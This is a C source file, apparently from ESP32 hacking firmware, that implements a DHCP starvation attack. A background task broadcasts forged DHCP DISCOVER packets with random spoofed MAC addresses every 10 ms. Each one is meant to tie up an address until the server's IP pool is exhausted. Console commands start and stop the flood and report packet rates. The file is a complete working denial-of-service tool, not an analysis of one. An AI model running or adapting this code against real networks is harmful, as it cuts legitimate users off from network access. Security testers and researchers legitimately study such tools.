/**
 * @file dhcp_starvation.c
 * @brief DHCP starvation attack implementation
 * 
 * This module handles DHCP starvation attacks that flood a DHCP server
 * with discover requests to exhaust its IP address pool.
 * 
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/dhcp_starvation.h"
#include "managers/wifi_manager.h"
#include "managers/status_display_manager.h"
#include "core/glog.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include "freertos/event_groups.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// External globals from wifi_manager.c
extern EventGroupHandle_t wifi_event_group;

// Local state
static volatile bool dhcp_starve_running = false;
static volatile uint32_t dhcp_starve_packets_sent = 0;
static TaskHandle_t dhcp_starve_task_handle = NULL;
static TaskHandle_t dhcp_starve_display_task_handle = NULL;

// DHCP packet structure
#pragma pack(push,1)
typedef struct {
    uint8_t op, htype, hlen, hops;
    uint32_t xid;
    uint16_t secs, flags;
    uint32_t ciaddr, yiaddr, siaddr, giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint8_t options[312];
} dhcp_packet_t;
#pragma pack(pop)

// DHCP starvation task
static void dhcp_starve_task(void *param) {
    (void)param;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    struct sockaddr_in addr = { 
        .sin_family = AF_INET, 
        .sin_port = htons(67), 
        .sin_addr.s_addr = htonl(INADDR_BROADCAST) 
    };
    
    while (dhcp_starve_running) {
        dhcp_packet_t pkt;
        memset(&pkt, 0, sizeof(pkt));
        pkt.op = 1; 
        pkt.htype = 1; 
        pkt.hlen = 6;
        pkt.xid = esp_random();
        pkt.flags = htons(0x8000);
        esp_fill_random(pkt.chaddr, 6);
        pkt.chaddr[0] &= 0xFE; 
        pkt.chaddr[0] |= 0x02;
        pkt.options[0] = 99; 
        pkt.options[1] = 130; 
        pkt.options[2] = 83; 
        pkt.options[3] = 99;
        pkt.options[4] = 53; 
        pkt.options[5] = 1; 
        pkt.options[6] = 1; 
        pkt.options[7] = 255;
        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
        dhcp_starve_packets_sent++;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    close(sock);
    dhcp_starve_task_handle = NULL;
    vTaskDelete(NULL);
}

// Display task for periodic stats
static void dhcp_starve_display_task(void *param) {
    (void)param;
    uint32_t prev_total = 0;
    while (dhcp_starve_running) {
        vTaskDelay(pdMS_TO_TICKS(5000));
        uint32_t total = dhcp_starve_packets_sent;
        uint32_t interval = total - prev_total;
        prev_total = total;
        uint32_t pps = interval / 5;
        glog("DHCP-Starve: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
    }
    dhcp_starve_display_task_handle = NULL;
    vTaskDelete(NULL);
}

void dhcp_starvation_start(int threads) {
    // Prevent starting DHCP starvation when not associated to an AP
    if (wifi_event_group != NULL) {
        EventBits_t bits = xEventGroupGetBits(wifi_event_group);
        if (!(bits & WIFI_CONNECTED_BIT)) {
            glog("Not connected to an AP\n");
            return;
        }
    }
    
    if (dhcp_starve_running) {
        glog("DHCP starvation already running\n");
        return;
    }
    
    glog("Starting DHCP starvation attack...\n");
    dhcp_starve_running = true;
    dhcp_starve_packets_sent = 0;
    
    // Note: threads parameter is currently ignored - single thread implementation
    (void)threads;
    
    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 4096, NULL, 5, &dhcp_starve_display_task_handle);
    
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("DHCP Starve");
#endif
}

void dhcp_starvation_stop(void) {
    if (!dhcp_starve_running) {
        return;
    }
    glog("DHCP-Starve stopped. Total: %lu packets\n", (unsigned long)dhcp_starve_packets_sent);
    dhcp_starve_running = false;
    
    // Wait for tasks to delete themselves (max 2 seconds)
    int wait_count = 0;
    while ((dhcp_starve_task_handle != NULL || dhcp_starve_display_task_handle != NULL) && wait_count < 20) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("DHCP Stopped");
#endif
}

void dhcp_starvation_display(void) {
    glog("DHCP-Starve: Total: %lu packets\n", (unsigned long)dhcp_starve_packets_sent);
}

void dhcp_starvation_help(void) {
    glog("DHCP Starvation Attack - Floods DHCP server to exhaust IP pool\n");
    glog("Usage: dhcpstarve start [threads]\n");
    glog("       dhcpstarve stop\n");
    glog("       dhcpstarve display\n");
}
